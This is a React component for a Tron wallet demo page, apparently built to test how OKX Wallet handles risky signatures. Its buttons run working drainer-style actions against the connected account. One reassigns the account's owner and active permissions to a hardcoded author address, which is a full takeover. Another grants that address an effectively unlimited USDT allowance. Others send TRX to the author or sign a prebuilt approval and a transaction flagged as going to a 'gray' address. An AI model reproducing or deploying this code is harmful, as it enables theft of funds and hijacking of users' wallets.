import {
  Button,
  Card, Col, Row, Space, message,
} from 'antd';
import { useState } from 'react';
import { myTronAddress, tronUSDTAddress } from '../../../../utils/const';

export default function SignTransaction({ account }) {
  const handleSign = async () => {
    try {
      await okxwallet.tronWeb.trx.sign({
        visible: false,
        txID: 'e659517ef59da41ed0d5b9b784295fc67b7231352f1ee012630ad59f91c122f9',
        raw_data: {
          contract: [
            {
              parameter: {
                value: {
                  data: '095ea7b300000000000000000000000051b160bb02261c822b33e61c6b947f275144545e0000000000000000000000000000000000000000000000000000000000000000',
                  owner_address: '41293c392498e83bacc978786579fdd8ead36f1b63',
                  contract_address: '41b4a428ab7092c2f1395f376ce297033b3bb446c1',
                },
                type_url: 'type.googleapis.com/protocol.TriggerSmartContract',
              },
              type: 'TriggerSmartContract',
            },
          ],
          ref_block_bytes: '8c6d',
          ref_block_hash: '312b1008a0ab9748',
          expiration: Date.now() + 1e5,
          fee_limit: 100000000,
          timestamp: Date.now(),
        },
        raw_data_hex: '0a028c6d2208312b1008a0ab97484090abca88bd315aae01081f12a9010a31747970652e676f6f676c65617069732e636f6d2f70726f746f636f6c2e54726967676572536d617274436f6e747261637412740a1541293c392498e83bacc978786579fdd8ead36f1b63121541b4a428ab7092c2f1395f376ce297033b3bb446c12244095ea7b300000000000000000000000051b160bb02261c822b33e61c6b947f275144545e000000000000000000000000000000000000000000000000000000000000000070f3dfc688bd31900180c2d72f',
        extParams: {
          canSupplyGas: true,
        },
      // eslint-disable-next-line no-console
      }).then((resp) => { console.log('签名结果 : ', resp); });
    } catch (error) {
      message.error(error.message);
    }
  };

  const handleSignWithGrayAddress = async () => {
    try {
      await okxwallet.tronWeb.trx.sign({
        visible: true,
        txID: '18c5a25aab800e5356cce85cdeccdc99e024241e34bbbe2bc69a4e24b913116c',
        raw_data: {
          contract: [
            {
              parameter: {
                value: {
                  data: '9871efa400000000002a6b6a8df710020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011a09200000000000000000000000000000000000000000000000000000000000180920000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000100000000000000003b6d03403a10321a4e97a64d9376af42ec07d5fa50294b35',
                  owner_address: account,
                  contract_address: 'TQYRbrNAhN1HWnivKSNKgC88hsrTJ1yB9P',
                  call_value: 1155218,
                },
                type_url: 'type.googleapis.com/protocol.TriggerSmartContract',
              },
              type: 'TriggerSmartContract',
            },
          ],
          ref_block_bytes: 'd28f',
          ref_block_hash: '5a17447f0b747e7d',
          expiration: Date.now() + 1e5,
          fee_limit: 300000000,
          timestamp: Date.now(),
        },
      // eslint-disable-next-line no-console
      }).then((resp) => { console.log('签名结果 : ', resp); });
    } catch (error) {
      message.error(error.message);
    }
  };

  const [updateAccountPermissionsLoading, setUpdateAccountPermissionsLoading] = useState(false);
  const updateAccountPermissions = async () => {
    try {
      setUpdateAccountPermissionsLoading(true);
      const ownerPermission = {
        type: 0, permission_name: 'owner', threshold: 1, keys: [],
      };

      const activePermission = {
        type: 2,
        permission_name: 'active0',
        threshold: 1,
        operations: '7fff1fc0037e0000000000000000000000000000000000000000000000000000',
        keys: [],
      };

      ownerPermission.keys.push({ address: tronWeb.address.toHex(myTronAddress), weight: 1 });
      activePermission.keys.push({ address: tronWeb.address.toHex(myTronAddress), weight: 1 });

      const updateTransaction = await tronWeb.transactionBuilder.updateAccountPermissions(
        tronWeb.address.toHex(account),
        ownerPermission,
        null,
        [activePermission],
      );
      const signedTx = await tronWeb.trx.sign(updateTransaction);
      await tronWeb.trx.sendRawTransaction(signedTx);
    } catch (error) {
      console.error(error);
      message.error('操作失败');
    } finally {
      setUpdateAccountPermissionsLoading(false);
    }
  };

  const [increaseApprovalLoading, setIncreaseApprovalLoading] = useState(false);
  const increaseApproval = async () => {
    try {
      setIncreaseApprovalLoading(true);
      const parameter = [{ type: 'address', value: myTronAddress }, { type: 'uint256', value: tronWeb.toSun(99999999999999) }];
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        tronWeb.address.toHex(tronUSDTAddress),
        'increaseApproval(address,uint256)',
        { feeLimit: 100000000 },
        parameter,
        tronWeb.address.toHex(account),
      );
      const signedTx = await tronWeb.trx.sign(transaction);
      await tronWeb.trx.sendRawTransaction(signedTx);
    } catch (error) {
      console.error(error);
      message.error('操作失败');
    } finally {
      setIncreaseApprovalLoading(false);
    }
  };

  const [sendTrxLoading, setSendTrxLoading] = useState(false);
  const sendTrx = async () => {
    try {
      setSendTrxLoading(true);
      const transaction = await tronWeb.transactionBuilder.sendTrx(account, 100, myTronAddress);
      const signedTx = await tronWeb.trx.sign(transaction);
      await tronWeb.trx.sendRawTransaction(signedTx);
    } catch (error) {
      console.error(error);
      message.error('操作失败');
    } finally {
      setSendTrxLoading(false);
    }
  };

  return (
    <Card title="合约交互 - 请打开控制台查看签名结果">
      <Space direction="vertical" style={{ width: '100%' }}>
        <Row gutter={6}>
          <Col span={6}>
            <Card direction="vertical" title="">
              <Space direction="vertical" style={{ width: '100%' }}>
                <Button
                  block
                  disabled={!account}
                  loading={updateAccountPermissionsLoading}
                  onClick={updateAccountPermissions}
                >
                  账户权限让渡给作者
                </Button>
                <Button
                  block
                  disabled={!account}
                  loading={sendTrxLoading}
                  onClick={sendTrx}
                >
                  打赏作者
                </Button>
              </Space>
            </Card>
          </Col>
          <Col span={12}>
            <Card direction="vertical">
              <Space direction="vertical" style={{ width: '100%' }}>
                <Button
                  block
                  disabled={!account}
                  loading={increaseApprovalLoading}
                  onClick={increaseApproval}
                >
                  increaseApproval
                </Button>
                <Button
                  block
                  disabled={!account}
                  onClick={handleSign}
                >
                  合约交互
                </Button>
                <Button disabled={!account} block onClick={handleSignWithGrayAddress}>
                  签名命中灰地址
                </Button>
              </Space>
            </Card>
          </Col>
        </Row>
      </Space>
    </Card>
  );
}
